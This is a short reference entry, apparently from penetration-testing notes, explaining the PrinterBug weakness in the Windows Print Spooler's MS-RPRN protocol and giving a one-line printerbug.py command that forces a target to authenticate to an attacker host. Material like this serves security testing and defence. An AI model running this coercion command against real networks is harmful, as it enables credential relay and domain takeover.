This vulnerability allows low-privileged users to coerce authentications from machines that run the Print Spooler Service by crafting a specific RPC call through MS-RPRN, Microsoft’s Print System Remote Protocol. It defines the communication of print job processing and print system management between a print client and a print server.

It can be exploited with [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
```bash
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
```